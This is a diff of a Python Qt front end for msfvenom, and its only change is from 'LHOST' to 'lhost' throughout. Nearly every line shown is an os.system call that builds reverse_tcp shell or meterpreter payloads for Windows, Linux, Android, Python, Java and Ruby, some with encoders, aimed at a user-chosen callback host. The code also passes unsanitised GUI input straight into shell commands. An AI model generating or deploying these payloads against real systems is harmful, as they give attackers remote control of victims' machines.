@@ -118,7 +118,7 @@ try:
 			def windows():
 				if self.encoder.currentText() == "none":
 					if self.formats.currentText() == "exe":
-						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f "+str(self.formats.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
+						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp lhost="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f "+str(self.formats.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
 						os.system("clear")
 						os.system("clear")
 						os.system("clear")
@@ -136,7 +136,7 @@ try:
 						else:
 							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 					elif self.formats.currentText() == "bat": #powershell
-						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f powershell -o "+str(self.save.text())+"."+str(self.formats.currentText()))
+						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp lhost="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f powershell -o "+str(self.save.text())+"."+str(self.formats.currentText()))
 						os.system("clear")
 						os.system("clear")
 						os.system("clear")
@@ -154,7 +154,7 @@ try:
 						else:
 							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 					elif self.formats.currentText() == "hta": #hta-psh
-						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f hta-psh -o "+str(self.save.text())+"."+str(self.formats.currentText()))
+						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp lhost="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f hta-psh -o "+str(self.save.text())+"."+str(self.formats.currentText()))
 						os.system("clear")
 						os.system("clear")
 						os.system("clear")
@@ -172,7 +172,7 @@ try:
 						else:
 							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 					elif self.formats.currentText() == "dll": #dll
-						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f "+str(self.formats.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
+						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp lhost="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f "+str(self.formats.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
 						os.system("clear")
 						os.system("clear")
 						os.system("clear")
@@ -190,7 +190,7 @@ try:
 						else:
 							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 					elif self.formats.currentText() == "msi": #msi
-						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f "+str(self.formats.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
+						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp lhost="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f "+str(self.formats.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
 						os.system("clear")
 						os.system("clear")
 						os.system("clear")
@@ -208,7 +208,7 @@ try:
 						else:
 							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 					elif self.formats.currentText() == "psh": #psh
-						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f "+str(self.formats.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
+						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp lhost="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f "+str(self.formats.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
 						os.system("clear")
 						os.system("clear")
 						os.system("clear")
@@ -227,7 +227,7 @@ try:
 							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 				##############################################################################################################################################################################################################################################################################################################################################
 				elif self.formats.currentText() == "exe":
-					os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f "+str(self.formats.currentText())+" -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
+					os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp lhost="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f "+str(self.formats.currentText())+" -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
 					os.system("clear")
 					os.system("clear")
 					os.system("clear")
@@ -245,7 +245,7 @@ try:
 					else:
 						error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 				elif self.formats.currentText() == "bat":
-					os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f powershell -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
+					os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp lhost="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f powershell -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
 					os.system("clear")
 					os.system("clear")
 					os.system("clear")
@@ -263,7 +263,7 @@ try:
 					else:
 						error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 				elif self.formats.currentText() == "hta":
-					os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f hta-psh  -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
+					os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp lhost="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f hta-psh  -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
 					os.system("clear")
 					os.system("clear")
 					os.system("clear")
@@ -281,7 +281,7 @@ try:
 					else:
 						error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 				elif self.formats.currentText() == "dll":
-					os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f "+str(self.formats.currentText())+" -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
+					os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp lhost="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f "+str(self.formats.currentText())+" -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
 					os.system("clear")
 					os.system("clear")
 					os.system("clear")
@@ -299,7 +299,7 @@ try:
 					else:
 						error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 				elif self.formats.currentText() == "msi":
-					os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f "+str(self.formats.currentText())+" -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
+					os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp lhost="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f "+str(self.formats.currentText())+" -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
 					os.system("clear")
 					os.system("clear")
 					os.system("clear")
@@ -317,7 +317,7 @@ try:
 					else:
 						error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 				elif self.formats.currentText() == "psh":
-					os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f "+str(self.formats.currentText())+" -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
+					os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp lhost="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f "+str(self.formats.currentText())+" -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
 					os.system("clear")
 					os.system("clear")
 					os.system("clear")
@@ -338,7 +338,7 @@ try:
 			def linux():
 				if self.encoder.currentText() == "none":
 					if self.formats.currentText() == "elf":
-						os.system("msfvenom -p "+str(self.platforms.currentText())+"/x86/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f "+str(self.formats.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
+						os.system("msfvenom -p "+str(self.platforms.currentText())+"/x86/"+str(self.payload.currentText())+"/reverse_tcp lhost="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f "+str(self.formats.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
 						os.system("clear")
 						os.system("clear")
 						os.system("clear")
@@ -357,7 +357,7 @@ try:
 							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 				###########################################################################################################################################################################################################################################################################################
 				elif self.formats.currentText() == "elf":
-					os.system("msfvenom -p "+str(self.platforms.currentText())+"/x86/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f "+str(self.formats.currentText())+" -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
+					os.system("msfvenom -p "+str(self.platforms.currentText())+"/x86/"+str(self.payload.currentText())+"/reverse_tcp lhost="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -f "+str(self.formats.currentText())+" -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
 					os.system("clear")
 					os.system("clear")
 					os.system("clear")
@@ -378,7 +378,7 @@ try:
 			def android():
 				if self.encoder.currentText() == "none":
 					if self.formats.currentText() == "apk":
-						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
+						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp lhost="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
 						os.system("clear")
 						os.system("clear")
 						os.system("clear")
@@ -396,7 +396,7 @@ try:
 						else:
 							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 				elif self.formats.currentText() == "apk":
-					os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
+					os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp lhost="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
 					os.system("clear")
 					os.system("clear")
 					os.system("clear")
@@ -418,7 +418,7 @@ try:
 				if self.encoder.currentText() == "none":
 					if self.formats.currentText() == "py":
 						if self.payload.currentText() == "shell":
-							os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"_reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
+							os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"_reverse_tcp lhost="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
 							os.system("clear")
 							os.system("clear")
 							os.system("clear")
@@ -436,7 +436,7 @@ try:
 							else:
 								error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 						elif self.payload.currentText() == "meterpreter":
-							os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
+							os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp lhost="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
 							os.system("clear")
 							os.system("clear")
 							os.system("clear")
@@ -455,7 +455,7 @@ try:
 								error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 				elif self.formats.currentText() == "py":
 					if self.payload.currentText() == "shell":
-						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"_reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
+						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"_reverse_tcp lhost="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
 						os.system("clear")
 						os.system("clear")
 						os.system("clear")
@@ -473,7 +473,7 @@ try:
 						else:
 							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 					elif self.payload.currentText() == "meterpreter":
-						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
+						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp lhost="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
 						os.system("clear")
 						os.system("clear")
 						os.system("clear")
@@ -494,7 +494,7 @@ try:
 			def java():
 				if self.encoder.currentText() == "none":
 					if self.formats.currentText() == "java":
-						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
+						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp lhost="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
 						os.system("clear")
 						os.system("clear")
 						os.system("clear")
@@ -512,7 +512,7 @@ try:
 						else:
 							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 					elif self.formats.currentText() == "jar":
-						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
+						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp lhost="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
 						os.system("clear")
 						os.system("clear")
 						os.system("clear")
@@ -530,7 +530,7 @@ try:
 						else:
 							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 				elif self.formats.currentText() == "java":
-					os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
+					os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp lhost="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
 					os.system("clear")
 					os.system("clear")
 					os.system("clear")
@@ -548,7 +548,7 @@ try:
 					else:
 						error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 				elif self.formats.currentText() == "jar":
-					os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
+					os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp lhost="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
 					os.system("clear")
 					os.system("clear")
 					os.system("clear")
@@ -570,7 +570,7 @@ try:
 				if self.encoder.currentText() == "none":
 					if self.formats.currentText() == "rb":
 						if self.payload.currentText() == "shell":
-							os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"_reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
+							os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"_reverse_tcp lhost="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
 							os.system("clear")
 							os.system("clear")
 							os.system("clear")
@@ -591,7 +591,7 @@ try:
 							error_generate = QMessageBox.about(self.window,"ERROR"," payload ruby it shell Just ); \n\n     Not meterpreter")
 				elif self.formats.currentText() == "rb":
 					if self.payload.currentText() == "shell":
-						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"_reverse_tcp LHOST="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
+						os.system("msfvenom -p "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"_reverse_tcp lhost="+str(self.lhost.text())+" LPORT="+str(self.lport.text())+" -e "+str(self.encoder.currentText())+" -o "+str(self.save.text())+"."+str(self.formats.currentText()))
 						os.system("clear")
 						os.system("clear")
 						os.system("clear")
